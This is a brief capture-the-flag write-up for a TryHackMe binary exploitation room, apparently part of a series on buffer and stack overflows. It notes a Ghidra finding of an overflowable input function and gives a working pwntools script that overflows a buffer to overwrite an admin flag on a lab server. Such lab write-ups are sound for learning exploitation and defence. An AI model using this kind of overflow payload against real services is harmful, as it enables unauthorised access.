## A bunch of Buffer/Stack Overflows
[oxb0b walkthrough](https://0xb0b.gitbook.io/writeups/tryhackme/2024/trypwnme-one)
**Ghidra**

Disassemble we see the get() function that is usaually overflowable, we see the admin varible(cross-referenced with the code sample in the room) is set to 0, but we need to set it to 1.

```python
from pwn import *
# Target IP and port
target_ip = '10.10.23.250'
target_port = 9003

# Connect to the remote server
p = remote(target_ip, target_port)

# Craft the payload
padding = b'A' * 16   # 16 bytes to fill the buffer
admin_value = p32(1) * 32  

payload = padding + admin_value 

# Send the payload
p.sendline(payload)

# Interact with the program to see the result (e.g., flag output)
p.interactive()
```
